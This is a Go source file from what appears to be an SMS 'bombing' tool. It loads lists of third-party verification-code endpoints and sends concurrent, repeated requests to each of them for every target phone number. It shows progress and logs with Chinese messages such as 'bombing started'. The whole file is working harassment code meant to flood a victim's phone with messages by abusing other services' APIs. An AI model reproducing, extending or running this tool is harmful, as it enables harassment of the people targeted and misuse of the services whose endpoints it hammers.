package boom

import (
	"github.com/gookit/color"
	"github.com/panjf2000/ants/v2"
	"github.com/schollz/progressbar/v3"
	"strings"
	"sync"
	"time"
)

var Progress *progressbar.ProgressBar
var ReqSum = 0
var ReqCount = 0
var ReqWg sync.WaitGroup

func Start(phone []string, frequency, interval, coroutineCount int) error {
	apis, err := loadApi()
	if err != nil {
		return err
	}
	color.Success.Printf("api.json 加载完成 接口数: %v\n", len(*apis))

	getApis, err := loadGetApi()
	if err != nil {
		return err
	}
	color.Success.Printf("getApi.json 加载完成 接口数: %v\n", len(*getApis))

	boom(apis, getApis, phone, frequency, interval, coroutineCount)

	return nil
}

func boom(apis *[]Api, getApis *[]string, phone []string, frequency, interval int, coroutineCount int) {
	color.Success.Print("\n轰炸开始！\n")

	ReqSum = (frequency * coroutineCount) * len(phone) * (len(*apis) + len(*getApis))
	Progress = progressbar.NewOptions64(
		int64(ReqSum),
		progressbar.OptionSetDescription("轰炸中"),
		progressbar.OptionSetWidth(25),
		progressbar.OptionShowCount(),
	)

	// 协程池
	defer ants.Release()
	apiPool, _ := ants.NewPoolWithFunc(PoolRunTimes, func(i interface{}) {
		reqByAPI(i.(*Api), phone)
		if ShowRequestLog == 0 {
			_ = Progress.Add(1) // 进度条+1
		}

		ReqCount++   // 请求次数+1
		ReqWg.Done() // 协程池-1
	})
	defer apiPool.Release()

	getApiPool, _ := ants.NewPoolWithFunc(PoolRunTimes, func(i interface{}) {
		reqByGetAPI(i.(string), phone)
		if ShowRequestLog == 0 {
			_ = Progress.Add(1) // 进度条+1
		}
		ReqCount++   // 请求次数+1
		ReqWg.Done() // 协程池-1
	})
	defer getApiPool.Release()

	// 处理
	for i := 0; i < frequency; i++ {
		var wg sync.WaitGroup
		for j := 0; j < coroutineCount; j++ {
			wg.Add(1)
			_ = ants.Submit(func() {
				for _, api := range *apis {
					ReqWg.Add(1)
					_ = apiPool.Invoke(&api)
				}

				for _, api := range *getApis {
					ReqWg.Add(1)
					_ = getApiPool.Invoke(api)
				}
				wg.Done()
			})
		}
		wg.Wait()

		if frequency > 1 {
			time.Sleep(time.Duration(interval) * time.Second)
		}
	}

	ReqWg.Wait()

	color.Success.Print("\n轰炸结束！\n")
}

func reqByAPI(api *Api, phone []string) {
	for _, ph := range phone {
		api.HandelApi(ph)
		resp, err := api.Send()
		if ShowRequestLog == 0 {
			return
		}

		if err != nil {
			log("error", api.Desc, err.Error())
		} else {
			body := []rune(string(resp.Body()))
			if len(body) >= 50 {
				body = body[:50]
			}
			log("info", api.Desc, string(body))
		}
	}
}

func reqByGetAPI(api string, phone []string) {
	for _, ph := range phone {
		resp, err := SendByGetApi(api, ph)
		if ShowRequestLog == 0 {
			return
		}

		if err != nil {
			log("error", "GetAPI接口", err.Error())
		} else {
			body := []rune(string(resp.Body()))
			if len(body) >= 50 {
				body = body[:50]
			}
			log("info", "GetAPI接口", string(body))
		}
	}
}

func log(level, name, content string) {
	colorLog := color.Info

	_, _ = time.LoadLocation("Asia/Shanghai") // UTC+08:00
	now := time.Now().Format("2006-01-02 15:04:05")

	if level == "error" {
		colorLog = color.Error
	}

	content = strings.ReplaceAll(content, "\\n", "")
	content = strings.ReplaceAll(content, "\\r", "")

	colorLog.Printf("[序号:%v]-[%v] %s - %v \n", ReqCount, now, name, content)
}
